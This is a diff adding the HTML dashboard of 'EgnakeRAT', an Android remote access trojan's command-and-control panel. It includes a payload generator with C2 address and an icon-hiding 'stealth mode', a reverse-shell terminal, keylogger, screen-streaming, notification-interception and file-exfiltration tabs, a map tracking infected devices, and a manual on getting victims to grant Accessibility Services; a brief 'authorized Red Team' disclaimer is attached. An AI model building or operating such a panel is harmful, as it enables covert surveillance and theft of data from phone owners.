@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EgnakeRAT</title>
+    <link rel="icon" type="image/png" href="/static/img/favicon.png">
+    <!-- Fonts -->
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap"
+        rel="stylesheet">
+    <!-- Map CSS -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+    <!-- Local CSS -->
+    <link rel="stylesheet" href="/static/css/dashboard.css?v=3">
+    <!-- Scripts -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.4/socket.io.min.js"></script>
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+</head>
+
+<body>
+    <div class="app-container">
+        <!-- Header -->
+        <header class="topbar">
+            <div class="brand">
+                <div class="brand-logo" style="display: flex; align-items: center; justify-content: center;">
+                    <img src="/static/img/favicon.png" alt="EgnakeRAT Logo" style="width: 28px; height: 28px; border-radius: 4px; object-fit: cover;">
+                </div>
+                <div class="brand-text">
+                    <h1>EgnakeRAT</h1>
+                    <span>SECURE NODE NETWORK</span>
+                </div>
+            </div>
+
+            <div class="global-stats">
+                <div class="stat-badge success">
+                    <i data-lucide="activity"></i>
+                    <span id="hd-online">0</span> ONLINE NODES
+                </div>
+                <div class="stat-badge info">
+                    <i data-lucide="cpu"></i>
+                    <span id="hd-total">0</span> TOTAL ASSETS
+                </div>
+                <div class="stat-badge warning">
+                    <i data-lucide="terminal"></i>
+                    <span id="hd-cmds">0</span> OPERATIONS
+                </div>
+                <div class="stat-badge danger">
+                    <i data-lucide="key"></i>
+                    <span id="hd-keylogs">0</span> INTERCEPTS
+                </div>
+            </div>
+
+            <div class="topbar-actions">
+                <div class="pulse-indicator">
+                    <span class="ring"></span>
+                    <span class="dot"></span>
+                </div>
+                <span class="system-time" id="sys-time">00:00:00 UTC</span>
+            </div>
+        </header>
+
+        <div class="main-wrapper">
+            <!-- Sidebar -->
+            <aside class="sidebar">
+                <div class="nav-menu">
+                    <div class="nav-header">SYSTEM VIEWS</div>
+                    <a class="nav-item active" id="nav-dash" onclick="switchMainView('dashboard')">
+                        <i data-lucide="layout-dashboard"></i>
+                        <span>Grid Overview</span>
+                    </a>
+                    <a class="nav-item" id="nav-map" onclick="switchMainView('map')">
+                        <i data-lucide="globe"></i>
+                        <span>Global Map</span>
+                    </a>
+                    <a class="nav-item" id="nav-build" onclick="switchMainView('build')">
+                        <i data-lucide="shield-alert"></i>
+                        <span>Payload Generator</span>
+                    </a>
+                    <a class="nav-item" id="nav-docs" onclick="switchMainView('docs')">
+                        <i data-lucide="book-open"></i>
+                        <span>Documentation</span>
+                    </a>
+                </div>
+
+                <div class="nav-menu flex-grow">
+                    <div class="nav-header flex-between">
+                        ACTIVE ASSETS
+                        <span class="badge" id="c-online-side">0</span>
+                    </div>
+                    <div class="device-list" id="device-list">
+                        <!-- Devices render here -->
+                    </div>
+                </div>
+            </aside>
+
+            <!-- Content Area -->
+            <main class="content-area">
+
+                <!-- â•â•â• DASHBOARD OVERVIEW â•â•â• -->
+                <div id="view-dashboard" class="view-panel active">
+                    <div class="stats-grid">
+                        <div class="gl-card stats-card">
+                            <div class="sc-icon text-cyan"><i data-lucide="radio"></i></div>
+                            <div class="sc-data">
+                                <div class="val" id="c-online">0</div>
+                                <div class="lbl">ONLINE NODES</div>
+                            </div>
+                        </div>
+                        <div class="gl-card stats-card">
+                            <div class="sc-icon text-indigo"><i data-lucide="cpu"></i></div>
+                            <div class="sc-data">
+                                <div class="val" id="c-total">0</div>
+                                <div class="lbl">TOTAL ASSETS</div>
+                            </div>
+                        </div>
+                        <div class="gl-card stats-card">
+                            <div class="sc-icon text-emerald"><i data-lucide="code"></i></div>
+                            <div class="sc-data">
+                                <div class="val" id="c-cmds">0</div>
+                                <div class="lbl">COMMANDS ISSUED</div>
+                            </div>
+                        </div>
+                        <div class="gl-card stats-card">
+                            <div class="sc-icon text-amber"><i data-lucide="fingerprint"></i></div>
+                            <div class="sc-data">
+                                <div class="val" id="c-keylogs">0</div>
+                                <div class="lbl">KEYSTROKES</div>
+                            </div>
+                        </div>
+                        <div class="gl-card stats-card">
+                            <div class="sc-icon text-rose"><i data-lucide="bell-ring"></i></div>
+                            <div class="sc-data">
+                                <div class="val" id="c-notifs">0</div>
+                                <div class="lbl">NOTIFICATIONS</div>
+                            </div>
+                        </div>
+                        <div class="gl-card stats-card">
+                            <div class="sc-icon text-purple"><i data-lucide="hard-drive"></i></div>
+                            <div class="sc-data">
+                                <div class="val" id="c-files">0</div>
+                                <div class="lbl">CAPTURED FILES</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="split-layout">
+                        <div class="gl-panel">
+                            <div class="panel-head">
+                                <i data-lucide="activity"></i> NETWORK TELEMETRY
+                            </div>
+                            <div class="panel-body no-pad">
+                                <div class="event-log" id="activity-log">
+                                    <div class="empty-state">
+                                        <i data-lucide="satellite"></i>
+                                        <h4>Awaiting Telemetry</h4>
+                                        <p>Grid standing by for incoming connections</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="gl-panel">
+                            <div class="panel-head">
+                                <i data-lucide="terminal-square"></i> GLOBAL TERMINAL
+                            </div>
+                            <div class="panel-body no-pad">
+                                <div class="shell-console">
+                                    <div class="console-history" id="term-out">
+                                        <div class="log-sys">EgnakeRAT C2 Subsystem Initialized.</div>
+                                        <div class="log-info">Awaiting commands. Use 'help' to list operations.</div>
+                                    </div>
+                                    <div class="console-input">
+                                        <span class="prompt">root@c2:~#</span>
+                                        <input type="text" id="term-input"
+                                            placeholder="Enter global command or select asset..."
+                                            onkeydown="if(event.key==='Enter')termExec()">
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- â•â•â• ASSET CONTROL (DEVICE VIEW) â•â•â• -->
+                <div id="view-device" class="view-panel" style="display:none;">
+                    <button class="btn btn-outline back-btn" onclick="switchMainView('dashboard')">
+                        <i data-lucide="arrow-left"></i> BACK TO GRID
+                    </button>
+
+                    <div class="asset-header gl-card">
+                        <div class="a-icon"><i data-lucide="smartphone"></i></div>
+                        <div class="a-main">
+                            <h2 id="d-model">IDENTIFYING...</h2>
+                            <div class="a-tags">
+                                <span class="tag success" id="d-status"><span class="dot"></span>ONLINE</span>
+                                <span class="tag" id="d-ip"><i data-lucide="network"></i> â€”</span>
+                                <span class="tag" id="d-os"><i data-lucide="type"></i> Android â€”</span>
+                            </div>
+                        </div>
+                        <div class="a-telemetry" id="d-chips">
+                            <!-- Populated dynamically -->
+                        </div>
+                    </div>
+
+                    <div class="module-tabs">
+                        <div class="tab active" onclick="switchTab('tactical')" data-tab="tactical"><i
+                                data-lucide="crosshair"></i> TACTICAL OPs</div>
+                        <div class="tab" onclick="switchTab('terminal')" data-tab="terminal"><i
+                                data-lucide="terminal"></i> TERM</div>
+                        <div class="tab" onclick="switchTab('keylogger')" data-tab="keylogger"><i
+                                data-lucide="keyboard"></i> COMMS INCEPT</div>
+                        <div class="tab" onclick="switchTab('screen')" data-tab="screen"><i
+                                data-lucide="monitor-play"></i> OPTICS</div>
+                        <div class="tab" onclick="switchTab('intel')" data-tab="intel"><i data-lucide="database"></i>
+                            INTEL FEED</div>
+                        <div class="tab" onclick="switchTab('files')" data-tab="files"><i data-lucide="folder-lock"></i>
+                            EXFIL</div>
+                        <div class="tab" onclick="switchTab('audit')" data-tab="audit"><i data-lucide="history"></i>
+                            AUDIT LOG</div>
+                    </div>
+
+                    <div class="tab-content gl-panel">
+                        <!-- TACTICAL OPs GRID -->
+                        <div id="tab-tactical" class="tab-pane active">
+                            <div class="commands-matrix" id="cmd-matrix"></div>
+                        </div>
+
+                        <!-- TERMINAL -->
+                        <div id="tab-terminal" class="tab-pane hidden">
+                            <div class="shell-console large">
+                                <div class="console-history" id="sh-out">
+                                    <div class="log-sys">Establishing secure reverse shell protocol...</div>
+                                    <div class="log-info">Press Enter to drop into shell.</div>
+                                </div>
+                                <div class="console-input">
+                                    <span class="prompt root">asset@shell:~#</span>
+                                    <input type="text" id="sh-input" placeholder="Type a command..."
+                                        onkeydown="if(event.key==='Enter')shellExec()">
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- KEYLOGGER -->
+                        <div id="tab-keylogger" class="tab-pane hidden">
+                            <div class="module-toolbar">
+                                <div class="m-status">
+                                    <div class="pulse-indicator"><span class="ring off" id="kl-ring"></span><span
+                                            class="dot off" id="kl-dot"></span></div>
+                                    <span id="kl-status-text">KEYLOGGER OFFLINE</span>
+                                </div>
+                                <div class="m-actions">
+                                    <button class="btn btn-primary" id="btn-kl-toggle" onclick="toggleKeylogger()"><i
+                                            data-lucide="power"></i> INITIATE</button>
+                                    <button class="btn btn-outline" onclick="loadKeylogs()"><i
+                                            data-lucide="refresh-cw"></i> SYNC</button>
+                                    <button class="btn btn-outline danger" onclick="clearKeylogUI()"><i
+                                            data-lucide="trash-2"></i> PURGE</button>
+                                </div>
+                            </div>
+                            <div class="keylog-stream" id="kl-stream"></div>
+                        </div>
+
+                        <!-- SCREEN OPTICS -->
+                        <div id="tab-screen" class="tab-pane hidden">
+                            <div class="module-toolbar">
+                                <div class="m-status">
+                                    <div class="pulse-indicator"><span class="ring off" id="ss-ring"></span><span
+                                            class="dot off" id="ss-dot"></span></div>
+                                    <span id="ss-status-text">OPTICS OFFLINE</span>
+                                </div>
+                                <div class="m-actions">
+                                    <select class="cyber-select" id="ss-fps">
+                                        <option value="3">3 FPS (Low BW)</option>
+                                        <option value="5" selected>5 FPS (Standard)</option>
+                                        <option value="10">10 FPS (High BW)</option>
+                                        <option value="15">15 FPS (Max)</option>
+                                    </select>
+                                    <button class="btn btn-primary" id="btn-ss-toggle" onclick="toggleScreenStream()"><i
+                                            data-lucide="video"></i> ENGAGE OPTICS</button>
+                                    <button class="btn btn-outline" onclick="toggleScreenFullscreen()"><i
+                                            data-lucide="maximize"></i> ENLARGE</button>
+                                </div>
+                            </div>
+                            <div class="optics-viewport" id="optics-view">
+                                <div class="optics-standby" id="optics-standby">
+                                    <i data-lucide="eye-off"></i>
+                                    <h4>NO SIGNAL</h4>
+                                    <p>Engage optics to intercept visual data feed.</p>
+                                </div>
+                                <canvas id="optics-canvas" class="hidden"></canvas>
+                                <div class="optics-hud hidden" id="optics-hud">
+                                    <div class="hud-fps" id="hud-fps">0 FPS</div>
+                                    <div class="hud-rec"><span class="dot blink warning"></span> REC</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- INTEL FEED (NOTIFICATIONS) -->
+                        <div id="tab-intel" class="tab-pane hidden">
+                            <div class="module-toolbar">
+                                <div class="m-status">
+                                    <i data-lucide="radio-receiver"></i> <span>SIGINT / NOTIFICATIONS</span>
+                                </div>
+                                <div class="m-actions">
+                                    <button class="btn btn-outline" onclick="loadNotifications()"><i
+                                            data-lucide="refresh-cw"></i> PULL INTEL</button>
+                                </div>
+                            </div>
+                            <div class="intel-feed" id="intel-feed">
+                                <div class="empty-state"><i data-lucide="inbox"></i>
+                                    <h4>NO INTEL</h4>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- EXFIL (FILES) -->
+                        <div id="tab-files" class="tab-pane hidden">
+                            <div class="table-container">
+                                <table class="cyber-table">
+                                    <thead>
+                                        <tr>
+                                            <th>ARTIFACT</th>
+                                            <th>CLASS</th>
+                                            <th>SIZE</th>
+                                            <th>TIMESTAMP (UTC)</th>
+                                            <th>ACTION</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="files-tbody"></tbody>
+                                </table>
+                            </div>
+                        </div>
+
+                        <!-- AUDIT LOG (HISTORY) -->
+                        <div id="tab-audit" class="tab-pane hidden">
+                            <div class="event-log" id="audit-log"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- â•â•â• MAP VIEW â•â•â• -->
+                <div id="view-map" class="view-panel hidden">
+                    <div class="gl-panel map-wrap">
+                        <div class="panel-head"><i data-lucide="map"></i> GLOBAL ASSET TRACKING</div>
+                        <div class="panel-body no-pad">
+                            <div id="map-container"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- â•â•â• BUILDER VIEW â•â•â• -->
+                <div id="view-build" class="view-panel hidden">
+                    <div class="split-layout">
+                        <div class="gl-panel">
+                            <div class="panel-head"><i data-lucide="wrench"></i> PAYLOAD GENERATOR</div>
+                            <div class="panel-body">
+                                <div class="cyber-form">
+                                    <div class="form-row">
+                                        <div class="field">
+                                            <label><i data-lucide="globe"></i> C2 ENDPOINT IP/FQDN</label>
+                                            <input type="text" id="b-ip" placeholder="192.168.1.100">
+                                        </div>
+                                        <div class="field">
+                                            <label><i data-lucide="plug"></i> PORT</label>
+                                            <input type="text" id="b-port" value="8000">
+                                        </div>
+                                    </div>
+                                    <div class="form-row">
+                                        <div class="field">
+                                            <label><i data-lucide="key-round"></i> AES-256 PASSPHRASE</label>
+                                            <input type="text" id="b-key" placeholder="Auto-fetched">
+                                        </div>
+                                        <div class="field">
+                                            <label><i data-lucide="eye"></i> STEALTH MODE</label>
+                                            <select class="cyber-select" id="b-icon">
+                                                <option value="true">ENABLE: Hide Icon</option>
+                                                <option value="false">DISABLE: Visible Icon</option>
+                                            </select>
+                                        </div>
+                                    </div>
+                                    <button class="btn btn-primary btn-block mt-4" onclick="initiateBuild()">
+                                        <i data-lucide="package"></i> GENERATE PAYLOAD
+                                    </button>
+                                    <div class="terminal-box mt-4" id="b-out">Ready for configuration.</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="gl-panel">
+                            <div class="panel-head"><i data-lucide="server"></i> C2 INFRASTRUCTURE INFO</div>
+                            <div class="panel-body" id="srv-info"></div>
+                        </div>
+                    </div>
+                </div>
+
+
+                <!-- Docs View -->
+                <div id="view-docs" class="view-panel hidden">
+                    <div class="gl-panel"
+                        style="max-width: 900px; margin: 0 auto; background: rgba(9, 9, 11, 0.6); backdrop-filter: blur(16px);">
+                        <div class="panel-head"
+                            style="font-size: 16px; font-weight: bold; padding: 20px; color: #ffffff;"><i
+                                data-lucide="book-open"></i> EGNAKERAT OPERATIONS MANUAL</div>
+                        <div class="panel-body"
+                            style="padding: 30px; line-height: 1.8; color: #A1A1AA; font-size: 14px;">
+
+                            <h3
+                                style="color: #ffffff; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px; margin-bottom: 15px;">
+                                1. Introduction & Integration</h3>
+                            <p style="margin-bottom: 25px;">EgnakeRAT is an advanced Command and Control (C2) neural
+                                network. To start intercepting data, you must deploy an operational package (Payload) to
+                                the targeted Android device. Once the device grants <strong
+                                    style="color: #ffffff;">Accessibility Services</strong>, it will securely tunnel out
+                                and instantly appear in your ACTIVE ASSETS sidebar.</p>
+
+                            <h3
+                                style="color: #ffffff; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px; margin-bottom: 15px;">
+                                2. Understanding Payload Generation</h3>
+                            <ul style="margin-bottom: 25px; padding-left: 20px;">
+                                <li style="margin-bottom: 15px;"><strong style="color: #ffffff;">IP Address:</strong>
+                                    The network address where the Android payload will loopback for its instructions.
+                                    For internet ops, use your VPS IP or Ngrok endpoint.</li>
+                                <li style="margin-bottom: 15px;"><strong style="color: #ffffff;">Listener Port:</strong>
+                                    The C2 server dynamically tracks devices by listening on the master socket port
+                                    (Default: 8000).</li>
+                                <li style="margin-bottom: 15px;"><strong style="color: #ffffff;">AES-256
+                                        Architecture:</strong> EgnakeRAT protects its neural pathways via AES-256. This
+                                    guarantees no rogue analyst can assume control of your infected nodes—even if they
+                                    intercept your IP and port.</li>
+                            </ul>
+
+                            <h3
+                                style="color: #ffffff; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px; margin-bottom: 15px;">
+                                3. Active Asset Modules</h3>
+                            <ul style="margin-bottom: 30px; padding-left: 20px;">
+                                <li style="margin-bottom: 10px;"><strong style="color: #ffffff;">Tactical
+                                        Optics:</strong> Remote screen interception. Keep frames below 5 FPS to avoid
+                                    extreme latency on low-bandwidth proxies.</li>
+                                <li style="margin-bottom: 10px;"><strong style="color: #ffffff;">Keylogger:</strong>
+                                    Asynchronously intercepts keystrokes via DOM hierarchy tracking logic on the device.
+                                </li>
+                                <li style="margin-bottom: 10px;"><strong style="color: #ffffff;">Global
+                                        Terminal:</strong> Perform zero-click operations from the UI
+                                    (<code>checkAccessibility</code>, <code>getLocation</code> etc.). Enter
+                                    <code>help</code> in the console.
+                                </li>
+                            </ul>
+
+                            <div
+                                style="background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); padding: 15px; border-radius: 8px; color: #EF4444; font-size: 12px; display: flex; align-items: center; gap: 15px;">
+                                <i data-lucide="alert-triangle" style="width: 30px; height: 30px;"></i>
+                                <span style="line-height: 1.5;"><strong
+                                        style="letter-spacing: 0.1em; color: #EF4444;">AUTHORIZATION
+                                        WARNING</strong><br>Strictly provisioned for authorized Red Team operations and
+                                    educational assessments. Unauthorized telemetry harvesting is prohibited.</span>
+                            </div>
+
+                        </div>
+                    </div>
+                </div>
+
+            </main>
+        </div>
+    </div>
+
+    <div id="toast-container" class="toast-stack"></div>
+
+    <script src="/static/js/dashboard.js?v=3"></script>
+</body>
+
+</html>
